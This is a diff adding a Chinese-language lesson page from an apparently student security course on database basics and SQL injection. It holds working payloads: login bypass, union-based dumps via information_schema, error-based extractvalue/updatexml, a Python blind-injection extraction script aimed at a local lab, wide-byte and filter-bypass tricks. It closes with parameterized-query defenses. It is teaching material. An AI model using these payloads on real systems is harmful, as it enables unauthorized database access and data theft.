@@ -1,0 +1,1032 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>其三 · 数据库与 SQL 注入 | 竹隐</title>
+<meta name="description" content="从数据库、关系模型、SQL 基础讲到注入的六种手法：联合查询、报错、布尔盲注、时间盲注、堆叠、二次、宽字节。附一个零配置的 SQL 靶场。">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='5' fill='%23a83a2c'/%3E%3Ctext x='32' y='46' font-size='38' text-anchor='middle' fill='%23f8f2e6' font-family='KaiTi,STKaiti,serif'%3E%E7%AB%B9%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="../assets/css/zhulin.css">
+<link rel="stylesheet" href="../assets/css/tools.css">
+</head>
+<body>
+
+<header class="site-head">
+  <a class="brand" href="../index.html">
+    <span class="seal">竹</span>
+    <span class="brand-text">
+      <b>竹隐</b>
+      <em>JNSEC &middot; WEB 26</em>
+    </span>
+  </a>
+  <nav class="site-nav" aria-label="站点导航">
+    <a href="../index.html">山门</a>
+    <a href="week01.html">其一 · 工具与 HTTP</a>
+    <a href="week02.html">其二 · 三种语言</a>
+    <a href="week03.html" aria-current="page">其三 · SQL 注入</a>
+    <a href="../roadmap.html">路线</a>
+  </nav>
+</header>
+
+<main class="reader">
+
+  <article>
+    <div class="juan-title">
+      <span class="plate">其三</span>
+      <h1>数据库与 SQL 注入</h1>
+    </div>
+
+    <p class="juan-deck">
+      前两讲，你学会了看请求、写脚本、读别人的代码。
+      这一讲往下走一层：到服务器背后那个装数据的地方去。
+      注入是 Web 安全里最老、也最经打的一类洞，它在 OWASP 榜单上待了二十年还没走。
+    </p>
+
+    <div class="juan-meta">
+      <span>第三讲</span>
+      <span class="dot">&middot;</span>
+      <span>数据库基础 + 六种注入手法</span>
+      <span class="dot">&middot;</span>
+      <span>含 1 个零配置 SQL 靶场</span>
+    </div>
+
+    <div class="prose">
+
+      <h2 id="s-intro" class="nonum" style="margin-top:2.4rem">这一讲在讲什么</h2>
+
+      <p>
+        前两讲的靶场，数据都是写死在代码里的。真实网站不是这样 ——
+        用户、文章、订单，全存在数据库里。
+      </p>
+
+      <p>
+        于是问题来了：网站要按用户输入查数据，那它怎么把"查询条件"告诉数据库？
+        最省事的做法是<strong>拼字符串</strong>。而拼字符串，就是注入的入口。
+      </p>
+
+      <blockquote>
+        <p>注入之所以存在，是因为有人把"数据"当成了"代码"来执行。</p>
+      </blockquote>
+
+      <p>
+        这一讲分两半：前一半讲数据库和 SQL 是什么、怎么用；
+        后一半讲攻击者怎么把这套东西掉过头来用。顺序不能反 ——
+        不先知道 SQL 长什么样，你根本看不出哪里被插了一段。
+      </p>
+
+
+      <h2 id="s-db">数据库到底解决什么问题</h2>
+
+      <p>
+        数据库出现之前，数据大多存在文件里。文件方案有三个绕不过去的毛病：
+      </p>
+
+      <ul>
+        <li><strong>冗余与不一致</strong> —— 同一个数据在好几个文件里各存一份，改了一个忘了另一个</li>
+        <li><strong>难以共享</strong> —— 数据和程序绑死，换个程序就得重新组织一遍</li>
+        <li><strong>并发与权限没法管</strong> —— 两个人同时写就乱了，谁能读谁能写也说不清</li>
+      </ul>
+
+      <p>
+        数据库管理系统（DBMS）干的就是把这些事统一管起来：
+        <strong>结构化地存、保证一致、允许多人同时用、控制谁能看什么、出事了能恢复。</strong>
+      </p>
+
+      <h3>三种数据模型，现在只用一种</h3>
+
+      <table>
+        <thead><tr><th style="width:7rem">模型</th><th style="width:6rem">结构</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr><td>层次模型</td><td>树</td><td>一对多，早期系统用，现在少见</td></tr>
+          <tr><td>网状模型</td><td>图</td><td>多对多，复杂但灵活，也少见了</td></tr>
+          <tr><td><strong>关系模型</strong></td><td>二维表</td><td><strong>主流</strong>。MySQL、PostgreSQL、SQLite 都是它</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        关系模型就是"用表存数据"。一张表有行有列，表之间靠键关联。
+        设计阶段常用 E-R 图（实体-联系图）画概念，再转成实际的表。
+      </p>
+
+      <p>几个必须记住的术语：</p>
+
+      <ul>
+        <li><strong>关系</strong>（relation）= 一张表</li>
+        <li><strong>元组</strong>（tuple）= 一行记录</li>
+        <li><strong>属性</strong>（attribute）= 一列</li>
+        <li><strong>主键</strong>（primary key）—— 能唯一标识一行的那列，比如学号。不能重复、不能为空</li>
+        <li><strong>外键</strong>（foreign key）—— 指向另一张表主键的列，用来建立关联</li>
+      </ul>
+
+      <h3>表怎么设计才算合理：范式</h3>
+
+      <p>
+        原文档把这块讲得挺清楚，我只把结论拎出来：
+      </p>
+
+      <ul>
+        <li><strong>1NF</strong> —— 每个字段都不可再分（别把"张三,李四"塞进一个格子）</li>
+        <li><strong>2NF</strong> —— 在 1NF 基础上，非主属性必须完全依赖主键，不能只依赖主键的一部分</li>
+        <li><strong>3NF</strong> —— 再进一步，不能有传递依赖（A 决定 B，B 决定 C，那 C 就不该直接存在这张表里）</li>
+        <li><strong>BCNF</strong> —— 更严格的一个版本</li>
+      </ul>
+
+      <p>
+        范式的目的是<strong>减少冗余、避免插入/删除/更新时出现矛盾</strong>。
+        但过度规范化会让查询要连很多表，性能下降。实际设计常在范式和性能之间权衡。
+      </p>
+
+      <p>
+        这块对做注入题的直接帮助不大，但它决定了你看到一张表时，
+        能不能看出"这个字段该不该在这"——审代码的时候有用。
+      </p>
+
+      <h3>完整性约束：数据库自己会拦的那些事</h3>
+
+      <ul>
+        <li><strong>实体完整性</strong> —— 主键不能空、不能重复</li>
+        <li><strong>参照完整性</strong> —— 外键必须指向一个真实存在的值</li>
+        <li><strong>用户定义完整性</strong> —— 比如年龄必须在 0 到 150 之间</li>
+      </ul>
+
+
+      <h2 id="s-sql">SQL 入门：能看懂、能改</h2>
+
+      <p>
+        SQL 是"结构化查询语言"，你不会写它，就看不懂注入的 payload。
+        这一节只讲够用的部分，剩下的等做题时现查。
+      </p>
+
+      <h3>SQL 语句分五类</h3>
+
+      <table>
+        <thead><tr><th style="width:6rem">类别</th><th style="width:7rem">全称</th><th>干什么</th></tr></thead>
+        <tbody>
+          <tr><td><strong>DDL</strong></td><td>数据定义</td><td>建库、建表、改结构。<code>CREATE</code> / <code>ALTER</code> / <code>DROP</code></td></tr>
+          <tr><td><strong>DML</strong></td><td>数据操作</td><td>增删改表里的数据。<code>INSERT</code> / <code>UPDATE</code> / <code>DELETE</code></td></tr>
+          <tr><td><strong>DQL</strong></td><td>数据查询</td><td>查数据。<code>SELECT</code> —— 你 90% 的时间在写它</td></tr>
+          <tr><td><strong>DCL</strong></td><td>数据控制</td><td>用户和权限。<code>GRANT</code> / <code>REVOKE</code></td></tr>
+          <tr><td><strong>TCL</strong></td><td>事务控制</td><td><code>COMMIT</code> / <code>ROLLBACK</code></td></tr>
+        </tbody>
+      </table>
+
+      <h3>注释：注入里最常用的语法</h3>
+
+      <p>MySQL 认四种注释，每种在注入里都有用处：</p>
+
+      <pre><code>-- 两个连字符，后面必须跟空格或控制字符，注释到行尾
+#  井号，注释到行尾
+/* 块注释，可以跨行 */
+/*! 可执行注释：MySQL 会把里面的内容当真执行 */</code></pre>
+
+      <div class="note secret">
+        <span class="note-tag">为什么注释在注入里这么重要</span>
+        <p>
+          两条经典用法，记住就行：
+        </p>
+        <ul>
+          <li>
+            <strong>截断后半句</strong>。原语句是
+            <code>... where username='$u' and password='$p'</code>，
+            你传 <code>admin'-- -</code>，后面那句密码校验就被注释掉了。
+          </li>
+          <li>
+            <strong>绕过黑名单</strong>。<code>union/**/select</code>、
+            <code>sel/**/ect</code>，关键字中间插注释，很多简单的过滤就漏了。
+          </li>
+        </ul>
+        <p>
+          还有 <code>/*!...*/</code> 那种"可执行注释"——它长得像注释，
+          但 MySQL 会执行里面的内容。某些 WAF 只去掉普通注释，就会漏掉这个。
+        </p>
+      </div>
+
+      <h3>建库、建表、增删改查</h3>
+
+      <p>先认全基本语句，不用背，知道有这么回事就行：</p>
+
+      <pre><code>-- 库
+show databases;                       -- 看有哪些库
+create database jnsec;                 -- 建库
+use jnsec;                             -- 切过去
+select database();                     -- 我现在在哪个库
+drop database jnsec;                   -- 删库（别乱敲）
+
+-- 表
+create table users (
+    id int primary key auto_increment,
+    username varchar(50),
+    password varchar(50)
+);
+
+-- 增
+insert into users (username, password) values ('admin', '123456');
+
+-- 删（不写 where 会把整张表清空）
+delete from users where id = 2;
+
+-- 改（不写 where 会把整列都改掉）
+update users set password = 'newpass' where id = 1;
+
+-- 查
+select * from users;                     -- 所有列
+select username from users;              -- 指定列
+select * from users where age &lt; 20;      -- 条件
+select * from users where id in (1,2,3); -- 集合
+select * from users where name like 'a%';-- 模糊：% 任意多个字符，_ 任意一个
+select * from users order by age desc;   -- 排序：asc 升序（默认），desc 降序
+select * from users limit 0, 2;          -- 分页：从第 0 条开始，取 2 条</code></pre>
+
+      <div class="note pit">
+        <span class="note-tag">两张表怎么合起来：UNION 与 JOIN</span>
+        <p>
+          这两个在注入里经常被搞混，先分清：
+        </p>
+        <ul>
+          <li>
+            <strong><code>UNION</code></strong> —— 把两个 SELECT 的<em>结果竖着拼起来</em>。
+            要求两边<strong>列数相同、类型相近</strong>。注入里用它，就是把你想查的东西
+            "接"在正常结果后面一起显示出来。
+          </li>
+          <li>
+            <strong><code>JOIN</code></strong> —— 把两张表<em>横向拼起来</em>，
+            靠关联字段匹配。写正常查询用。
+          </li>
+        </ul>
+      </div>
+
+      <h3>权限：DCL</h3>
+
+      <p>这块对防御有意义 —— 后面讲"最小权限"会用到：</p>
+
+      <pre><code>-- 建用户（用户名@来源地址，localhost 表示只准本机连）
+create user 'jnsec'@'localhost' identified by 'qwert@12345';
+
+-- 授权：把 test 库里所有对象的这些权限给他
+grant select, insert, update, delete on test.* to 'jnsec'@'localhost';
+
+-- 收权：grant 换成 revoke，to 换成 from
+revoke delete on test.* from 'jnsec'@'localhost';
+
+-- 查看
+show grants for 'jnsec'@'localhost';</code></pre>
+
+      <h3>连上 MySQL</h3>
+
+      <p>
+        用 phpstudy 的话，MySQL 的可执行文件在
+        <code>phpstudy_pro\Extensions\MySQL...\bin</code> 下：
+      </p>
+
+      <pre><code>mysql -u root -p          # 回车后提示输密码
+mysql -u root -p123456    # -p 后面不加空格，直接跟密码</code></pre>
+
+      <p>
+        连上之后命令以分号结尾，<code>\h</code> 看帮助。
+        phpstudy 里也能装 phpMyAdmin，图形界面点点点，本质还是执行 SQL。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">MySQL 不等于数据库</span>
+        <p>
+          MySQL 只是众多关系数据库软件中的一种。SQLite 更轻（没有服务进程，直接读写文件）、
+          MSSQL 和 Oracle 常见于企业环境。它们都支持 SQL，但语法细节和特性差别不小 ——
+          这点在注入时很关键，<strong>换个数据库，payload 可能就完全不一样了</strong>。
+        </p>
+      </div>
+
+
+      <h2 id="s-why">注入是怎么发生的</h2>
+
+      <p>
+        先看一段最经典的登录代码：
+      </p>
+
+      <pre><code>&lt;?php
+$username = @$_POST['username'];
+$password = @$_POST['password'];
+
+$sql = "select * from users where username = '$username' and password = '$password';";
+$rs = mysqli_query($conn, $sql);
+
+if ($rs-&gt;fetch_row()) {
+    echo "success";
+} else {
+    echo "fail";
+}
+?&gt;</code></pre>
+
+      <p>
+        逻辑没问题：用户名密码都对上就登录。问题出在<strong>字符串拼接</strong>上。
+      </p>
+
+      <p>
+        假设你填的用户名是 <code>admin</code>，密码填这个：
+      </p>
+
+      <pre><code>' or '1'='1</code></pre>
+
+      <p>拼出来的 SQL 就变成：</p>
+
+      <pre><code>select * from users where username = 'admin' and password = '' or '1'='1';</code></pre>
+
+      <p>
+        拆开看：<code>'1'='1'</code> 永远为真，所以整个条件永远为真，
+        <code>or</code> 后面的东西全被短路了。<strong>这就是"万能密码"。</strong>
+      </p>
+
+      <p>
+        构造方式千变万化（<code>admin'-- -</code>、<code>' or 1=1#</code>、<code>' or 'a'='a</code>），
+        但本质只有一句：<strong>服务器把你输入的东西当成了 SQL 代码的一部分</strong>。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">换个角度理解：数据与代码没分开</span>
+        <p>
+          正经的查询应该是："我要找一个 <em>用户名等于这段文字</em> 的用户"——
+          这段文字是<strong>数据</strong>，无论它长什么样，都只当文字看。
+        </p>
+        <p>
+          而拼接的做法是：把文字塞进 SQL 语句的语法结构里，然后整体解析。
+          于是文字里带的引号、<code>or</code>、<code>--</code> 就变成了语法。
+        </p>
+        <p>
+          防御的核心思想就一句话：<strong>让数据永远是数据，不进入语法解析的通道。</strong>
+          后面第八节的"参数化查询"，干的就是这件事。
+        </p>
+      </div>
+
+
+      <h2 id="s-find">找注入点：类型、闭合、字段数</h2>
+
+      <p>
+        拿到一个 URL，怎么知道它能不能注、该怎么注？有个固定套路。
+      </p>
+
+      <h3>第一步：判断有没有注入</h3>
+
+      <p>最常用的两个动作：</p>
+
+      <pre><code>id=1 and 1=1    -- 页面正常
+id=1 and 1=2    -- 页面异常 → 说明 and 后面的条件真的被数据库执行了 → 有注入</code></pre>
+
+      <p>
+        或者直接甩一个单引号 <code>'</code>，看页面会不会报错、或者内容和之前不一样。
+      </p>
+
+      <h3>第二步：判断闭合方式</h3>
+
+      <p>
+        这一步决定了你后面所有 payload 的写法。三种常见情况：
+      </p>
+
+      <table>
+        <thead><tr><th style="width:6rem">类型</th><th>后端语句长这样</th><th>你要怎么填</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>数字型</td>
+            <td><code>select * from t where id = 1</code></td>
+            <td>不用闭合，直接接 <code>and 1=1</code></td>
+          </tr>
+          <tr>
+            <td>字符型</td>
+            <td><code>select * from t where id = '1'</code></td>
+            <td>先用 <code>'</code> 把引号闭合，再接 <code>and 1=1-- -</code></td>
+          </tr>
+          <tr>
+            <td>搜索型</td>
+            <td><code>select * from t where name like '%test%'</code></td>
+            <td>要用 <code>%'</code> 闭合</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>
+        另外还有 <code>()</code>、<code>""</code> 这类闭合，看具体语句。判断的办法都一样：
+        <strong>猜它外面包了什么，然后把它"补全"。</strong>
+      </p>
+
+      <h3>第三步：判断字段数</h3>
+
+      <p>
+        因为 <code>UNION</code> 要求两边列数相同，所以得先知道原查询有几列：
+      </p>
+
+      <pre><code>id=1 order by 1;    -- 不报错
+id=1 order by 2;    -- 不报错
+id=1 order by 3;    -- 不报错
+id=1 order by 4;    -- 报错 → 说明只有 3 列</code></pre>
+
+      <p>
+        <code>order by N</code> 的意思是"按第 N 列排序"，第 N 列不存在就会报错。
+        一直往上试，到报错为止，前一个数就是列数。
+      </p>
+
+      <h3>第四步：选手法</h3>
+
+      <p>
+        这一步决定了你接下来是几分钟搞定，还是要跑一晚上脚本：
+      </p>
+
+      <pre><code>页面显示查询结果        →  联合查询注入（最快）
+页面显示数据库报错      →  报错注入
+两者都没有              →  布尔盲注（慢，要脚本）
+连真假都判断不出来      →  时间盲注（最慢，但最稳）
+
+特殊场景：堆叠注入 / 二次注入 / 宽字节注入</code></pre>
+
+      <div class="note">
+        <span class="note-tag">这块的顺序别搞反</span>
+        <p>
+          新手常犯的错是一上来就写盲注脚本，跑了一晚上才拿到库名 ——
+          而那个页面其实是有回显的，<code>union select</code> 一条就全出来了。
+        </p>
+        <p><strong>先花两分钟确认回显情况，能省几个小时的力气。</strong></p>
+      </div>
+
+
+      <h2 id="s-union">联合查询注入</h2>
+
+      <p>
+        最好用的一种，前提是<strong>页面会把查询结果回显出来</strong>。
+      </p>
+
+      <h3>它的核心逻辑</h3>
+
+      <p>
+        原查询是 <code>select id, name from users where id = 1</code>。
+        你把它变成：
+      </p>
+
+      <pre><code>select id, name from users where id = -1
+union select 1, database()</code></pre>
+
+      <p>
+        前半句 <code>id = -1</code> 查不到任何东西（保证结果集空着），
+        后半句的结果就被接在同一个位置显示出来。
+      </p>
+
+      <p>
+        <strong>为什么前面要返回空？</strong>因为如果前半句有结果，
+        有的页面只显示第一行，你的 union 结果就被挤掉了。
+        用 <code>-1</code> 或者一个不存在的 id 就稳了。
+      </p>
+
+      <h3>从"能注"到"能拖库"：信息模式</h3>
+
+      <p>
+        MySQL 5.0 以后有个特殊的库叫 <code>information_schema</code>，
+        它存的是<strong>"数据库自己的信息"</strong>：有哪些库、哪些表、哪些列。
+      </p>
+
+      <table>
+        <thead><tr><th style="width:11rem">表</th><th style="width:11rem">关键字段</th><th>装的是什么</th></tr></thead>
+        <tbody>
+          <tr><td><code>information_schema.schemata</code></td><td><code>schema_name</code></td><td>所有库名</td></tr>
+          <tr><td><code>information_schema.tables</code></td><td><code>table_name</code></td><td>所有表名</td></tr>
+          <tr><td><code>information_schema.columns</code></td><td><code>column_name</code></td><td>所有列名</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        这就是从"能注入"到"能把整个库拖下来"的桥。<strong>记住这三个表，一大半的题都能解。</strong>
+      </p>
+
+      <h3>完整流程，五步</h3>
+
+      <pre><code>-- ① 判断列数（假设是 4）
+id=1 order by 4;
+
+-- ② 找当前库名（让前半句空着，结果留给 union）
+id=-1 union select database(), 2, 3, 4;
+
+-- ③ 查这个库里有哪些表
+id=-1 union select group_concat(table_name), 2, 3, 4
+from information_schema.tables
+where table_schema = database();
+
+-- ④ 查某张表有哪些列（把上一步的表名填进去）
+id=-1 union select group_concat(column_name), 2, 3, 4
+from information_schema.columns
+where table_name = 'users' and table_schema = database();
+
+-- ⑤ 直接把数据读出来
+id=-1 union select group_concat(username, 0x3a, password), 2, 3, 4
+from users;</code></pre>
+
+      <div class="note">
+        <span class="note-tag">几个实用的小技巧</span>
+        <ul>
+          <li>
+            <strong><code>group_concat()</code></strong> —— 把多行合成一行显示。
+            不加它，一次只能看到一个值。
+          </li>
+          <li>
+            <strong><code>0x3a</code></strong> —— 十六进制的冒号，用来把用户名和密码拼在一起，
+            比 <code>concat(username, ':', password)</code> 少写几个字符。
+          </li>
+          <li>
+            <strong>回显位</strong> —— 页面上真正显示出来的那几列。
+            用 <code>2,3,4</code> 这种挨个试，哪个位置能看到数字，哪个就是回显位。
+          </li>
+        </ul>
+      </div>
+
+      <div class="lab">
+        <div class="lab-sign">
+          <span class="stamp">实操</span>
+          <h3>打一遍 SQL 靶场</h3>
+        </div>
+        <ol class="step">
+          <li>
+            靶场跟着一键启动就起来了，不用另外配：
+            <div class="cmd"><code>http://127.0.0.1:8083/</code></div>
+            用 <code>本地运行.bat</code> 启动时，它会自动起在 8083；
+            也可以手动 <code>php -S 127.0.0.1:8083 router.php</code>（在 <code>lab/sql_lab/</code> 下）。
+          </li>
+          <li>
+            第一关是数字型注入。先确认它和数据库是通的：
+            <div class="cmd"><code>?id=1 and 1=1</code> &nbsp; / &nbsp; <code>?id=1 and 1=2</code></div>
+          </li>
+          <li>
+            然后按上面五步走。这一关的表结构简单，先查 <code>sqlite_master</code>
+            （相当于 SQLite 的 information_schema），再读 <code>secrets</code> 表。
+          </li>
+        </ol>
+        <p style="margin-top:1rem;margin-bottom:0;font-size:.9rem;color:var(--ink-faint)">
+          靶场用的是 SQLite，不是 MySQL —— 所以元数据表的名字不一样（这点下面有说明）。
+          注入的原理完全一样。
+        </p>
+      </div>
+
+      <h2 id="s-error">报错注入</h2>
+
+      <p>
+        页面不显示查询结果，但会把数据库的报错信息打印出来 —— 这种情况用报错注入。
+      </p>
+
+      <h3>原理：让错误信息自己把数据带出来</h3>
+
+      <p>
+        SQL 执行时会先算参数、再调用函数。某些函数在参数格式不对时会报错，
+        而<strong>报错信息里会带上你传进去的那个参数值</strong>。
+      </p>
+
+      <p>
+        于是就有了这么一招：把想查的数据<em>拼进参数</em>，让它出现在错误信息里。
+      </p>
+
+      <h3>最常用的两个函数</h3>
+
+      <pre><code>-- extractvalue(xml_frag, xpath_expr)
+-- 从 XML 里按 XPath 取值。xpath_expr 写错就会报错，并把表达式内容带出来
+id=1 and extractvalue(1, concat(0x7e, (select database()), 0x7e))
+
+-- updatexml(xml_target, xpath_expr, new_xml)
+-- 同样是 XPath 解析失败时报错
+id=1 and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)</code></pre>
+
+      <p>
+        <code>0x7e</code> 是波浪号 <code>~</code>。它不是一个合法的 XPath 写法，
+        所以一定会报错 —— 而报错信息长这样：
+      </p>
+
+      <pre><code>XPATH syntax error: '~jnsec_db~'</code></pre>
+
+      <p>库名就这么"报"出来了。</p>
+
+      <div class="note pit">
+        <span class="note-tag">两个必须知道的限制</span>
+        <ul>
+          <li>
+            <strong>长度有限</strong>。报错信息通常只显示前 32 个字符左右，
+            长了会被截断。所以要用 <code>substr()</code> 分段读，或者用 <code>limit</code> 一次读一条。
+          </li>
+          <li>
+            <strong>版本有关</strong>。MySQL 5.1 以后才有这两个函数。
+            新版本（8.0+）对 XPath 报错的处理有变化，某些环境里不好用了 ——
+            遇到打不出来，换 <code>GTID_SUBSET</code>、<code>exp()</code> 之类的函数试试。
+          </li>
+        </ul>
+      </div>
+
+      <p>
+        报错函数不止这两个。思路是通用的：<strong>找一个"参数写错就把参数值抛进错误里"的函数</strong>。
+        做题时搜"MySQL 报错注入函数"能翻出一大把。
+      </p>
+
+      <h3>SQLite 没有这条路</h3>
+
+      <p>
+        我们靶场用的是 SQLite，它没有 <code>extractvalue</code>，
+        报错信息也不会带出参数值。所以靶场里没有报错注入那一关 ——
+        这个手法需要 MySQL 环境，装个 sqli-lab 就能练。
+      </p>
+
+
+      <h2 id="s-blind">盲注：没有回显怎么办</h2>
+
+      <p>
+        前两种手法都依赖页面给你点什么 —— 结果，或者报错。
+        如果页面什么都不给呢？只显示"用户存在"和"用户不存在"两种状态？
+      </p>
+
+      <p>
+        那就只能一个字一个字地猜。这听起来很蠢，但<strong>机器不怕蠢</strong>。
+      </p>
+
+      <h3>布尔盲注：用"真/假"当信道</h3>
+
+      <pre><code>-- 问：user() 的第一个字符是不是 'r'？
+id=1 and substr((select user()), 1, 1) = 'r'</code></pre>
+
+      <p>
+        页面正常 → 是；页面异常 → 不是。
+        换成 <code>ascii()</code> 更好写脚本，因为可以直接比较数字：
+      </p>
+
+      <pre><code>id=1 and ascii(substr((select user()), 1, 1)) = 114</code></pre>
+
+      <p>
+        114 是 <code>r</code> 的 ASCII 码。脚本的逻辑就是：
+        <strong>遍历所有可打印字符，挨个试，哪个让页面"真"了，就记下来，接着猜下一位。</strong>
+      </p>
+
+      <pre><code>import requests
+
+url = "http://127.0.0.1:8083/gate3"
+flag = ""
+
+for pos in range(1, 60):
+    for code in range(32, 127):
+        # 靶场是 SQLite，取字符码用 unicode()；
+        # MySQL 那边对应的是 ascii()，作用一样
+        payload = "1 and unicode(substr((select value from secrets where id=2),%d,1))=%d" % (pos, code)
+        r = requests.get(url, params={"id": payload})
+        if "存在" in r.text:          # 页面回显"存在"就说明猜对了
+            flag += chr(code)
+            print(flag)
+            break
+    else:
+        break                          # 所有字符都不匹配，说明到头了
+
+print("结果:", flag)</code></pre>
+
+      <p>
+        一个字符最多试 95 次，一段 30 字符的 flag 要发近三千个请求。
+        所以<strong>盲注一定要上脚本</strong>，手工点是点不完的。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">优化思路</span>
+        <p>
+          95 次太多？可以用<strong>二分法</strong>：不猜具体值，只问"大于 64 吗"，
+          每次砍掉一半，7 次就能确定一个 ASCII 字符（因为 2 的 7 次方是 128）。
+        </p>
+        <p>再进一步，用 <code>regexp</code> 或者 <code>like</code> 可以一次匹配多个字符。</p>
+      </div>
+
+      <h3>时间盲注：连真假都看不出来</h3>
+
+      <p>
+        页面永远是同一个样子，那只能靠<strong>响应时间</strong>了：
+      </p>
+
+      <pre><code>-- 如果第一个字符是 'r'，就睡 2 秒
+id=1 and if(substr((select user()),1,1)='r', sleep(2), 1)</code></pre>
+
+      <p>
+        脚本那边就是测响应时间：超过 2 秒 → 猜对；秒回 → 猜错。
+      </p>
+
+      <p>
+        时间盲注还能用来<strong>确认注入点到底存不存在</strong>：
+        有时候页面没变化，你以为没洞，其实只是没回显。
+        发一个 <code>and sleep(3)</code> 试试，卡了三秒就说明代码被执行了。
+      </p>
+
+      <div class="note secret">
+        <span class="note-tag">记住这句话</span>
+        <p>
+          <strong>盲注的核心思想：没有回显，就自己造一个回显。</strong>
+        </p>
+        <p>
+          页面真假是一种信道，响应时间是一种信道，DNS 请求、报错、状态码……
+          任何能观察到的差异，都能当信道。这是盲注最本质的地方 ——
+          手法会变，思路不变。
+        </p>
+      </div>
+
+      <div class="lab">
+        <div class="lab-sign">
+          <span class="stamp">实操</span>
+          <h3>用脚本把盲注跑出来</h3>
+        </div>
+        <p>
+          第三节的靶场第三关就是布尔盲注。页面只告诉你"这个用户存在"或"不存在"，
+          其他什么都不给。
+        </p>
+        <p>
+          把上面那段脚本存成 <code>blind.py</code>，改成靶场地址，跑起来：
+        </p>
+        <div class="cmd"><code>python blind.py</code></div>
+        <p style="margin-bottom:0;font-size:.9rem;color:var(--ink-faint)">
+          你会看到它一个字符一个字符往外蹦。这就是盲注真实的样子 ——
+          不快，但只要能观察到差异，就一定能拿到。
+        </p>
+      </div>
+
+
+      <h2 id="s-special">特殊场景：三条不那么直的路</h2>
+
+      <h3>堆叠注入</h3>
+
+      <p>
+        用分号把多条语句拼在一起，让数据库一条一条执行：
+      </p>
+
+      <pre><code>id=1; select database();</code></pre>
+
+      <p>
+        <strong>能不能成功，取决于驱动。</strong>PHP 的 <code>mysqli_query</code>
+        默认只执行一条，PDO 要专门开 <code>PDO::MYSQL_ATTR_MULTI_STATEMENTS</code> 才行。
+        MySQL 相对少见，MSSQL 里更常见。
+      </p>
+
+      <p>
+        危害也大 —— 因为它能执行任意 SQL，不只读，还能增删改。
+      </p>
+
+      <h3>二次注入</h3>
+
+      <p>
+        最绕的一种。恶意数据<strong>先存进库，之后被取出来重新拼接</strong>，才触发注入。
+      </p>
+
+      <p>
+        经典场景是修改密码：
+      </p>
+
+      <pre><code>update users set password='$new' where username='$user' and password='$old';</code></pre>
+
+      <p>
+        注册一个用户名叫 <code>admin'#</code> 的账号 —— 注册时不会有问题，
+        因为注册的语句只是把这段文字存进去。
+      </p>
+
+      <p>
+        等你改这个账号的密码时，它被取出来拼接：
+      </p>
+
+      <pre><code>update users set password='新密码' where username='admin'#' and password='$old';</code></pre>
+
+      <p>
+        <code>#</code> 把后面全注释了。<strong>于是你不需要知道 admin 的原密码，就把 admin 的密码改了。</strong>
+      </p>
+
+      <div class="note pit">
+        <span class="note-tag">为什么它特别坑</span>
+        <p>
+          因为第一次入库时，数据可能已经被转义过了 —— 看起来"安全"。
+          但取出来之后，那些转义符往往又被还原，或者干脆原样拼进了新语句。
+        </p>
+        <p>
+          <strong>这就是"只做转义"不算防御的典型例子。</strong>
+        </p>
+      </div>
+
+      <h3>宽字节注入</h3>
+
+      <p>
+        这个跟编码有关，第二讲讲编码时埋过伏笔。
+      </p>
+
+      <p>
+        前提两个：数据库连接字符集是 <strong>GBK</strong>，代码用
+        <code>addslashes()</code> 这类<em>基于字符</em>的转义。
+      </p>
+
+      <p>
+        正常情况：你传 <code>'</code>，它转义成 <code>\'</code>，引号就失效了。
+      </p>
+
+      <p>
+        但 GBK 里一个汉字占<strong>两个字节</strong>。如果你传 <code>%df'</code>：
+      </p>
+
+      <pre><code>%df'  --转义--&gt;  %df\'  --也就是 %df%5c%27
+
+GBK 解析时：%df%5c 被当成一个完整的汉字（"運"），
+            剩下 %27 就是一个光秃秃的单引号 → 逃逸成功</code></pre>
+
+      <p>payload 长这样：</p>
+
+      <pre><code>?id=%df' and 1=1 --+</code></pre>
+
+      <p>
+        本质是<strong>编码方式不一致</strong>：转义模块按单字节处理，数据库按双字节解析，
+        中间那一段被"吃"掉了。
+      </p>
+
+
+      <h2 id="s-defend">绕过与防御</h2>
+
+      <h3>常见绕过手法</h3>
+
+      <table>
+        <thead><tr><th style="width:8rem">手法</th><th>例子</th><th>绕过什么</th></tr></thead>
+        <tbody>
+          <tr><td>大小写混写</td><td><code>SeLEcT</code></td><td>只匹配小写关键词的黑名单</td></tr>
+          <tr><td>等价函数</td><td><code>substr</code> → <code>mid</code> / <code>left</code> / <code>right</code></td><td>函数名黑名单</td></tr>
+          <tr><td>空格替代</td><td><code>+</code>、<code>/**/</code>、<code>%09</code>、<code>%0a</code></td><td>过滤空格的规则</td></tr>
+          <tr><td>十六进制</td><td><code>'test'</code> → <code>0x74657374</code></td><td>引号被过滤</td></tr>
+          <tr><td>注释插入</td><td><code>un/**/ion</code>、<code>sel/**/ect</code></td><td>关键词整体匹配</td></tr>
+          <tr><td>编码绕过</td><td>URL 编码、Unicode、双重编码</td><td>解码顺序不一致</td></tr>
+          <tr><td>元数据替代</td><td><code>information_schema</code> → <code>mysql.innodb_table_stats</code></td><td>元数据表被禁</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        这些手法的共同点：<strong>黑名单永远列不全</strong>。
+        你今天封了 <code>union</code>，人家明天用 <code>union all</code>、用注释拆开、用大写。
+      </p>
+
+      <h3>防御：三层</h3>
+
+      <h4>第一层 · 参数化查询（治本）</h4>
+
+      <p>
+        核心是<strong>先把 SQL 骨架编译好，再把参数当数据传进去</strong>。
+        这样数据到数据库时，语法解析已经结束了 —— 你传什么内容都只是值。
+      </p>
+
+      <pre><code>// Java
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, userInput);      // 输入只当字符串
+ps.setString(2, passwordInput);
+
+// PHP PDO
+$stmt = $pdo->prepare('SELECT id, username FROM users WHERE username = :username');
